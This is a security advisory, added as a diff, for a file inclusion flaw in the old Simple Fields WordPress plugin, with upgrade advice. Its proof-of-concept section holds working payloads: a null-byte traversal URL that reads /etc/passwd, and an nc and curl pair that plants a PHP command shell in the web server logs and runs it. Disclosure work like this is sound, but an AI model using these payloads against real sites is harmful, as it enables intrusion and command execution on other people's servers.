@@ -1,0 +1,42 @@
+# Exploit Title: Simple Fields 0.2 - 0.3.5 LFI/RFI/RCE
+# Date: 2018-04-08
+# Exploit Author: Graeme Robinson
+# Contact: @Grasec
+# Vendor Homepage: http://simple-fields.com
+# Software Link: https://downloads.wordpress.org/plugin/simple-fields.0.3.5.zip
+# Version: 0.2 - 0.3.5
+# Tested on: Ubuntu 16.04.4 + PHP 5.3.0
+# Category: webapps
+
+
+1. Description
+Versions 0.2 to 0.3.5 of the Simple Fields WordPress plugin are vulnerable to local file inclusion if running on PHP <5.3.4. This can even lead to remote code execution, for example by injecting php code into the apache logs or if allow_url_include is turned on in php.ini.
+
+PHP <5.3.4 is required because the exploit relies on the ability to inject a null byte to terminate a string before the script expects it to be and this was fixed in PHP 5.3.4
+
+The vulnerability was fixed (commented out) in version 0.3.6 on 2011-02-03. Simple Fields is no longer actively developed, since 2016-02-27 (http://simple-fields.com/2016/bye-bye-simple-fields/)
+
+The vulnerable line of code in simple_fields.php is:
+    require( $_GET["wp_abspath"] . './wp-blog-header.php' );
+
+
+2. Proof of concept
+LFI:
+    http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
+
+RCE:
+    $ echo "<?system(\$_GET['cmd'])?>"|nc host 80
+    $ curl "http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=../../../../../logs/access_log%00&cmd=id"
+
+
+3. Solutions:
+* Upgrade PHP to 5.3.4+
+* Update Simple Fields to 0.3.6+
+* Stop using Simple Fields because it is no longer supported
+
+
+4. Relevant Links:
+* http://simple-fields.com
+* https://wordpress.org/plugins/simple-fields/
+* https://downloads.wordpress.org/plugin/simple-fields.0.3.5.zip
+* https://github.com/bonny/WordPress-Simple-Fields
